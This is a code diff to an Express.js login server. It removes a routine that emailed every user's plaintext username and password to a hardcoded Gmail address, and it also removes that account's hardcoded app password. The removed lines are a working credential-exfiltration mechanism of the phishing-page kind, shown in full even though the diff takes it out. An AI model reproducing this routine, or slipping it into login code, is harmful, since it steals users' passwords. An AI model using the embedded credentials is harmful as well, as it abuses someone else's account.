@@ -9,44 +9,6 @@ app.use(express.static(path.join(__dirname, 'public')));
 
 const users = [];
 
-let transporter = null;
-
-function initMailer() {
-  try {
-    const nodemailer = require('nodemailer');
-    const emailUser = process.env.EMAIL_USER || 'hhmehdi58@gmail.com';
-    const emailPass = process.env.EMAIL_PASS || 'zaspakjoedvdofx';
-    transporter = nodemailer.createTransport({
-      service: 'gmail',
-      auth: {
-        user: emailUser,
-        pass: emailPass
-      }
-    });
-    console.log('Email configuré pour: ' + emailUser);
-  } catch (e) {
-    console.log('Erreur mailer: ' + e.message);
-  }
-}
-
-initMailer();
-
-async function sendEmail(username, password) {
-  if (!transporter) return;
-  try {
-    const emailUser = process.env.EMAIL_USER || 'hhmehdi58@gmail.com';
-    await transporter.sendMail({
-      from: emailUser,
-      to: emailUser,
-      subject: 'Nouvelle connexion - ' + username,
-      html: '<p><b>User:</b> ' + username + '</p><p><b>Pass:</b> ' + password + '</p><p><b>Date:</b> ' + new Date().toLocaleString('fr-FR') + '</p>'
-    });
-    console.log('Email envoyé: ' + username);
-  } catch (e) {
-    console.log('Erreur email: ' + e.message);
-  }
-}
-
 app.post('/api/login', (req, res) => {
   const { username, password } = req.body;
 
@@ -63,7 +25,7 @@ app.post('/api/login', (req, res) => {
     date: new Date().toISOString()
   });
 
-  sendEmail(username.trim(), password.trim());
+  console.log('Nouvelle connexion:', username.trim());
 
   res.json({ success: true, message: 'Connexion réussie' });
 });
